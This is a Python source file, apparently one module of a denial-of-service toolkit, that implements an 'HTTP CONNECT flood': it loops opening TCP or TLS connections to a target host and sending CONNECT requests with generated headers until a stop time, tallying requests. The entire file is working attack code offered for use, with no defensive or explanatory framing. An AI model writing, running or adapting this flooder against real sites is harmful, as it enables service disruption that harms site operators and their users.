'''

Copyright (c) 2022 Nexus/Nexuzzzz

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

'''

import time, socket, ssl

from urllib.parse import urlparse
from src.core import Core
from src.utils import *
from src.useragent import *

def flood(attack_id, url, stoptime) -> None:

    if not Core.target_host: Core.target_host = urlparse(url).hostname
    if not Core.target_port: Core.target_port = urlparse(url).port if urlparse(url).port else (80 if urlparse(url).scheme == 'http' else 443)

    sockets = []
    while time.time() < stoptime and not Core.killattack:
        if not Core.attackrunning:
            continue

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)

            if Core.target_port == 443: # if the port is HTTPS (HTTP over SSL/TLS), wrap the socket
                sock = ssl.create_default_context().wrap_socket(
                    sock=sock,
                    server_hostname=Core.target_host
                )

            sockets.append(socket)
            sock.connect((Core.target_host, int(Core.target_port)))
        
            payload = f'CONNECT' # CONNECT http method
            payload+= f' {Core.target_host}:{str(Core.target_port)}' # target host + port
            payload+= f' HTTP/{Core.http_proto_ver}\r\n' # http protocol version
            payload+= f'Host: {Core.target_host}:{str(Core.target_port)}\r\n' # Host
            payload+= str(utils().buildheaders(url, True)) # append all headers
            payload+= '\r\n\r\n'

            sock.send(payload.encode()) # and finally send the request  
            Core.infodict[attack_id]['req_sent'] += 1
        except Exception:
            Core.infodict[attack_id]['req_fail'] += 1

        Core.infodict[attack_id]['req_total'] += 1
    
    for sock in sockets:
        sock.close() # close the connection

    Core.threadcount -= 1

Core.methods.update({
    'CONNECT': {
        'info': 'HTTP CONNECT flood',
        'func': flood
    }
})